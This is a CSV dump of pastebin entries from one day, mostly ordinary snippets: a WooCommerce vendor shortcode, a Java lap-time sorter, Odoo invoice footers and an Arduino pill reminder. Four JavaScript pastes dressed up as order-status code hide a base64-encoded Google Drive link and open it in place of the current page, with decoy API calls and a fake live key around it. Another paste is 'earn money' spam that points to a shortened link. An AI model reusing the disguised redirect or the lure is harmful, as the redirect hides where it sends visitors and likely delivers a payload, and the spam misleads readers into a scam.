id,title,username,language,date,content
Y41EuSPn,Untitled,hubertzoo90,JavaScript,Monday 14th of April 2025 07:07:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46563/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Xu4x88By,wcfm_shortcode_get_vendor_list_by_spmv_product_id,palsushobhan,PHP,Monday 14th of April 2025 06:57:29 AM CDT,"/* List of vendors selling a particular product (SPMV), sorted by product price ASC*/
add_shortcode('wcfm_vendors_card_by_product', function($attr) {
    global $wpdb, $WCFMmp;
    if ( empty( $attr['id'] ) || ! absint( $attr['id'] ) ) return '';
    $product_id = absint( $attr['id'] );
    $product = wc_get_product($product_id);
    if(!$product) return '';
    $vendor_id = wcfm_get_vendor_id_by_post($product_id);
    if(!apply_filters( 'wcfm_is_allow_product_multivendor_title_edit_disable', true )) return $vendor_id;
    $multi_parent_id = get_post_meta( $product_id, '_is_multi_parent', true );
    if(!$multi_parent_id) {
        $multi_parent_id = get_post_meta( $product_id, '_has_multi_selling', true );
    }
    if(!$multi_parent_id) return $vendor_id;
    $sql = ""SELECT GROUP_CONCAT(product_id) as products FROM `{$wpdb->prefix}wcfm_marketplace_product_multivendor` WHERE `parent_product_id` = $multi_parent_id"";
    $results = $wpdb->get_row( $sql );
    $product_list = isset($results->products) ? explode(',', $results->products) : array();
    if(!in_array($multi_parent_id, $product_list)) {
        array_unshift($product_list, $multi_parent_id);
    }
    $product_ids = implode(',', $product_list);
    $sql = ""SELECT product_id, stock_status, stock_quantity FROM {$wpdb->wc_product_meta_lookup} wc_product_meta_lookup WHERE product_id IN (%1s) ORDER BY wc_product_meta_lookup.min_price ASC"";
    $prepare = $wpdb->prepare($sql, $product_ids);
    $product_metas = $wpdb->get_results($prepare);
    $vendor_list = [];
    if( !empty( $product_metas ) ) {
        foreach( $product_metas  as $pmkey => $product_meta ) {
            if( $product_meta->stock_status == 'outofstock' ) continue;
            $post_status = get_post_status( $product_meta->product_id );
            if( $post_status != 'publish' ) continue;
            $vendor_id = wcfm_get_vendor_id_by_post( $product_meta->product_id );
            if( $vendor_id && !in_array( $vendor_id, $vendor_list ) ) {
                $vendor_list[] = $vendor_id;
            }            
        }
    }
    if( empty( $vendor_list ) ) return '';
    ob_start();
    ?>
    <div id=""wcfmmp-stores-wrap"" class=""top-vendor-container"">
        <div class=""wcfmmp-stores-content"">
            <ul class=""top-vendor-list wcfmmp-store-wrap"">
                <?php
                $args = array('per_row' => 3);
                foreach ( $vendor_list as $vendor_id ) {	
                    $args['store_id'] = $vendor_id;
                    $WCFMmp->template->get_template( 'store-lists/wcfmmp-view-store-lists-card.php', $args );
                }
                ?>
            </ul>
        </div>
    </div>
    <?php
    $list = ob_get_contents();
    ob_end_clean();
    return $list;
});"
NzGBj4AT,Products.js,hubertzoo90,JavaScript,Monday 14th of April 2025 06:51:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83205/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CRjJabA2,[NP] F1 Race,dzocesrce,Java,Monday 14th of April 2025 06:40:33 AM CDT,"import java.io.*;
import java.util.List;
import java.util.stream.Collectors;
import java.time.Duration;
import java.time.LocalTime;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;

class Driver implements Comparable<Driver> {
    public static int finalPos=0;

    private String name;
    private List<Lap> laps;

    public Driver(String name,List<Lap> laps) {
        this.name = name;
        this.laps = laps;
    }

    private Lap getFastestLap(){
        return laps.stream().min(Comparator.naturalOrder()).get();
    }
    public static Driver createDriver(String s) {
        String[] parts = s.split(""\\s+"");
        String name = parts[0];
        List<Lap> laps = new ArrayList<>();
        laps.add(new Lap(parts[1]));
        laps.add(new Lap(parts[2]));
        laps.add(new Lap(parts[3]));
        return new Driver(name,laps);
    }

    @Override
    public int compareTo(Driver o) {
        return (int)Long.compare(getFastestLap().getLocalTimeVersion().toNanoOfDay()
                ,o.getFastestLap().getLocalTimeVersion().toNanoOfDay());
    }

    @Override
    public String toString() {
        return String.format(""%d. %-10s%10s"",++finalPos,name,getFastestLap().getTime());
    }
}

class Lap implements Comparable<Lap>{
    private String time;

    public Lap(String time) {
        this.time = time;
    }

    public String getTime() {
        return time;
    }

    public LocalTime getLocalTimeVersion(){
        String[] parts= time.split("":"");
        int minutes= Integer.parseInt(parts[0]);
        int seconds= Integer.parseInt(parts[1]);
        int nanos= Integer.parseInt(parts[2]);
        return LocalTime.of(0,minutes,seconds,nanos);
    }

    @Override
    public int compareTo(Lap o) {
        return (int)Long.compare(getLocalTimeVersion().toNanoOfDay(),o.getLocalTimeVersion().toNanoOfDay());
    }

    @Override
    public String toString() {
        return time+"" ""+getLocalTimeVersion();
    }
}

class F1Race {

    private List<Driver> drivers;

    public F1Race() {
        this.drivers = drivers;
    }

    public void readResults(InputStream in) {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));
        this.drivers= bufferedReader.lines().map(i->Driver.createDriver(i)).collect(Collectors.toList());
    }

    public void printSorted(PrintStream out) {
        PrintWriter printWriter= new PrintWriter(out);

        this.drivers.stream().sorted().forEach(i->printWriter.println(i));
        printWriter.flush();
    }
}

public class F1Test {

    public static void main(String[] args) {
        F1Race f1Race = new F1Race();
        f1Race.readResults(System.in);
        f1Race.printSorted(System.out);

    }

}
"
dkppcMpU,Order.js,hubertzoo90,JavaScript,Monday 14th of April 2025 06:36:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51513/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
QgyLBfhU,[QW][4707829]special_footer_external_layout_boxed,rht_odoo,XML,Monday 14th of April 2025 06:25:25 AM CDT,"<data>
    <!--
    Done by RHT on the 14/04/2025
    Need : different footer for commerical invoice
    Task : https://www.odoo.com/odoo/project.task/4707829
    Pastebin : https://pastebin.com/QgyLBfhU
    -->
    <xpath expr=""//div[contains(@class, 'footer')]"" position=""replace"">
        <div t-attf-class=""footer o_company_#{company.id}_layout {{report_type != 'pdf' and 'mt-auto'}}"" t-if=""commercial_footer"">
            <div class=""o_footer_content row border-top pt-2"">
                <div class=""col-8"">
                    I certify that the information presented on this invoice is true and accurate to the best of my knowledge.
                </div>
                <div class=""row"">
                    <div class=""col-5"">
                        <strong>Authorized By:</strong>   __________________________
                    </div>
                    <div class=""col-4"">
                        <strong>Title:</strong>   __________________________
                    </div>
                    <div class=""col-3"">
                        <strong>Date:</strong>   _________________
                    </div>
                    
                </div>
            </div>
        </div>
        <div t-attf-class=""footer o_company_#{company.id}_layout {{report_type != 'pdf' and 'mt-auto'}}"" t-if=""not commercial_footer"">
            <div class=""o_footer_content row border-top pt-2"">
                <div class=""col-8"">
                    <span t-field=""company.report_footer""/>
                </div>
                <div class=""col-4 text-end"">
                    <strong t-if=""company.report_header"" t-field=""company.report_header"" class=""o_company_tagline"">Company tagline</strong>
                    <span t-if=""report_type == 'pdf' and display_name_in_footer"" class=""text-muted"" t-out=""str(o.name) + ', '"">(document name)</span>
                    <span t-if=""report_type == 'pdf'"" class=""text-muted"">Page <span class=""page""/> / <span class=""topage""/></span>
                </div>
            </div>
        </div>
    </xpath>
    
</data>"
xQEgQzGy,[QW][4707829]commercial_footer_invoice_document,rht_odoo,XML,Monday 14th of April 2025 06:21:40 AM CDT,"<data>
    <!--
    Done by RHT on the 14/04/2025
    Need : different footer for commerical invoice
    Task : https://www.odoo.com/odoo/project.task/4707829
    Pastebin : https://pastebin.com/xQEgQzGy
    -->
    <xpath expr=""//t[2]"" position=""after"">
        <t t-set=""commercial_footer"" t-value=""true""/>
    </xpath>
</data>"
mAJLF5tp,Market.js,hubertzoo90,JavaScript,Monday 14th of April 2025 06:20:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/63729/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JC3fDmqN,EARN $900 INSTANTLY 2025 2U,bhentzz,JavaScript,Monday 14th of April 2025 06:14:14 AM CDT," 
Pdf https://tinyurl.com/privguidee


52w89U6IbX
"
jkGUCrX0,**Medication Reminder** rev_01,pleasedontcode,Arduino,Monday 14th of April 2025 06:05:44 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: **Medication Reminder**
	- Source Code NOT compiled for: ESP8266 NodeMCU V1.0
	- Source Code created on: 2025-04-14 11:04:03

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Display reminder for pill at 4:40 pm ist via rtc */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <EasyButton.h>	//https://github.com/evert-arias/EasyButton
#include <Wire.h>
#include <RTClib.h>
#include <LiquidCrystal_I2C.h>

// Initialize RTC and LCD
RTC_DS3231 rtc;
LiquidCrystal_I2C lcd(0x27, 16, 2); // I2C address may be 0x3F on some LCDs

// Medicine info
String medicines[4] = {""Paracetamol"", ""Vitamin C"", ""Antibiotic"", ""Painkiller""};
int reminderHours[4] = {16}; // Reminder set for 4 PM (16:00 in 24hr format)
int reminderMinutes[4] = {40}; // Reminder set for 40 minutes past the hour

// Other components
const int ledPin = 14;   // D5 on NodeMCU (Change pin if needed)
const int buzzerPin = 0; // D3 on NodeMCU
const int buttonPin = 2; // D4 on NodeMCU

// Flag to track reminders
bool alertTriggered[4] = {false, false, false, false};
unsigned long lastDisplayUpdate = 0;

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t Button_PushButton_PIN_D1		= 1; // This pin is not used in the USER CODE

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/

void setup(void)
{
	// put your setup code here, to run once:
	Serial.begin(9600);
	Wire.begin();
	rtc.begin();
	lcd.begin(16, 2);  // Corrected begin with cols and rows
	lcd.backlight();

	// Setup output pins
	pinMode(ledPin, OUTPUT);
	digitalWrite(ledPin, LOW);

	pinMode(buzzerPin, OUTPUT);
	pinMode(buttonPin, INPUT_PULLUP);

	lcd.setCursor(0, 0);
	lcd.print(""  Pill Time Boot "");
	delay(2000);
	lcd.clear();

	pinMode(Button_PushButton_PIN_D1, INPUT_PULLUP); // Keep this for compatibility with EasyButton
}

void loop(void)
{
	DateTime now = rtc.now();

	// Update time display every second
	if (millis() - lastDisplayUpdate >= 1000) {
		showTime(now);
		lastDisplayUpdate = millis();
	}

	// Check reminders
	for (int i = 0; i < 4; i++) {
		if (now.hour() == reminderHours[i] && now.minute() == reminderMinutes[i] && !alertTriggered[i]) {
			triggerReminder(i);
			alertTriggered[i] = true;
		}

		// Reset trigger for next day
		if (now.hour() != reminderHours[i] || now.minute() != reminderMinutes[i]) {
			alertTriggered[i] = false;
		}
	}

	delay(100);
}

void showTime(DateTime now) {
	char timeBuffer[9];
	sprintf(timeBuffer, ""%02d:%02d:%02d"", now.hour(), now.minute(), now.second());

	lcd.setCursor(0, 0);
	lcd.print(""Time: "");
	lcd.print(timeBuffer);
	lcd.print(""  ""); // Padding
}

void triggerReminder(int index) {
	lcd.clear();
	lcd.setCursor(0, 0);
	lcd.print(""Take: "");
	lcd.print(medicines[index].substring(0, 10)); // Fit name in LCD
	digitalWrite(ledPin, HIGH);  // Turn on LED
	tone(buzzerPin, 1000);

	// Wait for pushbutton acknowledgment
	while (digitalRead(buttonPin) == HIGH) {
		delay(100);
	}

	// Acknowledged
	noTone(buzzerPin);
	digitalWrite(ledPin, LOW);  // Turn off LED

	lcd.clear();
	lcd.setCursor(0, 0);
	lcd.print(medicines[index]);
	lcd.setCursor(0, 1);
	lcd.print(""Taken ✔"");
	delay(2000);
	lcd.clear();
}

/* END CODE */"
